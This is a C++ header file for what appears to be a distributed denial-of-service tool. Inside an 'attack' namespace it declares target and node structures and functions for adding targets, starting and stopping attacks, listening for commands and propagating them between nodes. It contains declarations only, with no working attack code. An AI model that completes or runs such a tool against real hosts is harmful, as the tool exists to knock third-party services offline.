#ifndef DDOS_H
#define DDOS_H

#include <omp.h>
#include <fstream>
#include <sstream>
#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <ctime>
#include <cstdlib>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <ifaddrs.h>

using namespace std;

namespace attack {
	const short PORT = 3000;

	struct target {
		string IP;
		short port;
		bool stream;
	};

	struct node {
		vector<string> nodes;
		vector<target> targets;
		bool active;
		bool attacking;

		int wait;
		long queue;

		node() : active(true),attacking(false),wait(3),queue(20) { }
		node(int wait, long queue) : active(true),attacking(false),wait(wait),queue(queue) { }
	};

	void new_target(node& node, string target);
	void new_node(vector<string>& nodes, string node);
	void start_attack(node& starter);
	void stop_attack(node& starter);
	void initialize(node& node);
	void terminate(node& node);
	void listen(node& node);
	void get_commands(node& node);
	void attack(node& node);
	void propagate(string node, char type, string message = "");

	int get_address(string name, short port, struct sockaddr_in* address);
};
#endif